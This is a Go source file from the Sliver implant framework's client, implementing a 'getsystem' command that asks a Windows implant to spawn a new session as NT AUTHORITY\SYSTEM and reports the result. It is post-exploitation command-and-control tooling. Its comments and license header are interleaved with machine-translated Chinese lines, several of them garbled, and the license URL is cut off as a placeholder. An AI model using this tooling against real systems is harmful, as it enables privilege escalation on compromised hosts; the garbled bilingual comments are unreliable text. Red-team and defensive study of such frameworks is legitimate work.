package privilege

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox
	Copyright (C) 2021 Bishop Fox

	This program is free software: you can redistribute it and/or modify
	This 程序是免费软件：您可以重新分发它 and/or 修改
	it under the terms of the GNU General Public License as published by
	它根据 GNU General Public License 发布的条款
	the Free Software Foundation, either version 3 of the License, or
	Free Software Foundation，License 的版本 3，或
	(at your option) any later version.
	（由您选择）稍后 version.

	This program is distributed in the hope that it will be useful,
	This 程序被分发，希望它有用，
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	但是WITHOUT ANY WARRANTY；甚至没有默示保证
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	MERCHANTABILITY 或 FITNESS FOR A PARTICULAR PURPOSE. See
	GNU General Public License for more details.
	GNU General Public License 更多 details.

	You should have received a copy of the GNU General Public License
	You 应已收到 GNU General Public License 的副本
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
	与此 program. If 不一起，请参见 <__PH0__
*/

import (
	"context"

	"google.golang.org/protobuf/proto"

	"github.com/spf13/cobra"

	"github.com/bishopfox/sliver/client/console"
	consts "github.com/bishopfox/sliver/client/constants"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// GetSystemCmd - Windows only, attempt to get SYSTEM on the remote system
// GetSystemCmd - 仅 Windows，尝试在远程系统上获取 SYSTEM
func GetSystemCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
	session, beacon := con.ActiveTarget.GetInteractive()
	if session == nil && beacon == nil {
		return
	}
	targetOS := getOS(session, beacon)
	if targetOS != "windows" {
		con.PrintErrorf("Command only supported on Windows.\n")
		return
	}

	process, _ := cmd.Flags().GetString("process")
	config := con.GetActiveSessionConfig()

	/* If the HTTP C2 Config name is not defined, then put in the default value
 If HTTP C2 Config 名称没有定义，则放入默认值
	   This will have no effect on implants that do not use HTTP C2
	   This 对不使用 HTTP C2 的种植体没有影响
	   Also this should be overridden when the build info is pulled from the
	   Also 当从 中提取构建信息时，应该覆盖它
	   database, but if there is no build info and we have to create the build
	   数据库，但如果没有构建信息，我们必须创建构建
	   from scratch, we need to have something in here.
	   从头开始，我们需要在 here. 中有一些东西
	*/
	if config.HTTPC2ConfigName == "" {
		config.HTTPC2ConfigName = consts.DefaultC2Profile
	}

	ctrl := make(chan bool)
	con.SpinUntil("Attempting to create a new sliver session as 'NT AUTHORITY\\SYSTEM'...", ctrl)

	getSystem, err := con.Rpc.GetSystem(context.Background(), &clientpb.GetSystemReq{
		Request:        con.ActiveTarget.Request(cmd),
		Config:         config,
		HostingProcess: process,
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}

	if getSystem.Response != nil && getSystem.Response.Async {
		con.AddBeaconCallback(getSystem.Response.TaskID, func(task *clientpb.BeaconTask) {
			err = proto.Unmarshal(task.Response, getSystem)
			if err != nil {
				con.PrintErrorf("Failed to decode response %s\n", err)
				return
			}
			PrintGetSystem(getSystem, con)
		})
		con.PrintAsyncResponse(getSystem.Response)
	} else {
		PrintGetSystem(getSystem, con)
	}
}

// PrintGetSystem - Print the results of get system
// PrintGetSystem - Print 获取系统的结果
func PrintGetSystem(getsystemResp *sliverpb.GetSystem, con *console.SliverClient) {
	if getsystemResp.Response != nil && getsystemResp.Response.GetErr() != "" {
		con.PrintErrorf("%s\n", getsystemResp.GetResponse().GetErr())
		return
	}
	con.Println()
	con.PrintInfof("A new SYSTEM session should pop soon...\n")
}
